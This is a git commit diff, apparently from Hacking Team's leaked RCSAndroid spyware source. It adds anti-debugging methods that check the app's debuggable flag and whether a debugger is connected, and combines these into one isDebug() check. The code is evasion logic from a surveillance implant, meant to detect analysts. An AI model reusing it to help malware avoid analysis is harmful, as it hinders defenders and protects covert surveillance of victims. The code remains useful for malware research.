02163fb8c89085918276cc68f384b917fbeb61b3
Zeno <zeno@hackingteam.com>
2013-05-06 16:04:22 +0200

    anti debug check

--- RCSAndroid/src/com/android/networking/util/AntiDebug.java
+++ RCSAndroid/src/com/android/networking/util/AntiDebug.java
@@ -1,9 +1,19 @@
 package com.android.networking.util;
 
+import com.android.networking.Status;
+
+import android.content.pm.ApplicationInfo;
 import android.os.Debug;
 
 public class AntiDebug {
-	public boolean DebugCheckIp(){
+	
+	public boolean checkFlag(){
+		boolean debug =
+	            (Status.self().getAppContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
+		return debug;
+	}
+	
+	public boolean checkIp(){
 		CheckDebugModeTask checkDebugMode = new CheckDebugModeTask();
 		checkDebugMode.execute("");
 		
@@ -17,7 +27,11 @@ public class AntiDebug {
 		return checkDebugMode.IsDebug;
 	}
 	
-	public boolean DebugCheckConnected(){
+	public boolean checkConnected(){
 		return Debug.isDebuggerConnected();
+	}
+	
+	public boolean isDebug(){
+		return checkFlag() || checkConnected() || checkIp() ;
 	}
 }
